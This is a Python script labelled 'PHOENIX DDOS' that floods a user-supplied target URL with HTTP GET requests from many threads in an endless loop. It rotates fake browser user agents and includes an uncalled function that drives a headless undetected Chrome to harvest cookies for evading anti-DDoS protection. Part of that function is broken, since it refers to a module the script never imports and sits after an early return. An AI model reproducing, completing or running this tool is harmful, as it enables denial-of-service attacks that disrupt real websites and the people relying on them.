# Import modules
import socket
import random
import urllib.parse # To parse the url and get the host and port
import requests
import threading # To use threading
import string # To generate random payload
import undetected_chromedriver as uc # To use undetected-chromedriver
from colorama import Fore

print(Fore.RED + 'PHOENIX DDOS')
print('')
print(Fore.RED + 'Dev: Mr.BotSytem')
print('')

# Define the target URL
url = input("Enter the target URL: ") # Change this to the target URL

# Parse the url and get the host and port
parsed_url = urllib.parse.urlparse(url)
host = parsed_url.hostname
port = parsed_url.port or 80 # Default to 80 if no port is specified

# Define the number of threads to use
threads = int(input("Enter the number of threads: ")) # Change this to the number of threads
      
# Define a function to bypass anti-DDoS protection using undetected-chromedriver
def bypass():

        # Create an options object for Chrome browser
        options = uc.ChromeOptions ()

        # Add arguments for headless mode and window size
        options.add_argument ("--headless")
        options.add_argument ("--window-size=1920x1080")

        # Create an undetected-chromedriver object with options
        driver = uc.Chrome (options=options)

        # Get target URL using driver
        driver.get (url)

        # Wait for page load
        driver.execute_script ("return document.readyState") == "complete"

        # Get cookies from driver
        cookies = driver.get_cookies ()

        # Convert cookies into requests format
        requests_cookies = {}

        for cookie in cookies:
                requests_cookies[cookie["name"]] = cookie["value"]

        # Return cookies dictionary
        return requests_cookies
        
        # Create a cloudscraper session object with requests_cookies
        scraper = cloudscraper.create_scraper(cookies=requests_cookies)

        # Make a GET request using the scraper object to the same URL
        response = scraper.get(url)

        # Print the response status code and content
        print(response.status_code)
        print(response.content)
        
        # Return the requests_cookies dictionary
        return requests_cookies


# Define a list of fake user agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
]


# Define a function to send requests to the target
def attack():
    # Create a socket object with TCP protocol and connect to the target host and port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

# Generate a random user agent from the list and a random payload with the user agent
    user_agent = random.choice(user_agents)
    payload = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\n\r\n".encode()

# Send requests to the target in an infinite loop
    while True:
        # Send the payload to the target and print a success message
        s.send(payload)
        print(f"Sent request to {host}:{port} with user agent {user_agent}")

# Create a loop to launch threads for sending requests
for i in range(threads):
    # Create and start a thread object with the attack function as the target
    threading.Thread(target=attack).start()
